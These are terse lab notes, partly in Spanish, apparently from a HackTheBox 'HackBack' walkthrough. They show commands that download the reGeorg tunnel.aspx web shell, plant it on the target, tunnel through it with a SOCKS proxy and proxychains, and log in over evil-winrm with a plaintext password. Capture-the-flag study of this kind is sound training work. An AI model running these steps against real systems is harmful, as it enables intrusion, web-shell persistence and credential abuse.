
### ASPX TUNNEL
```shell
❯ wget https://raw.githubusercontent.com/sensepost/reGeorg/refs/heads/master/tunnel.aspx
# SUBIR A LA MÁQUINA EL ARCHIVO .ASPX
❯ python2 reGeorgSocksProxy.py -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/pwned.aspx -p 1234
❯ sudo vim /etc/proxychains.conf
	socks4 127.0.0.1 1234
[POR EJEMPLO VOY A OPERAR CON WINRM]
❯ sudo proxychains evil-winrm -i 127.0.0.1 -u 'simple' -p 'ZonoProprioZomaro:-(' 2>/dev/null
```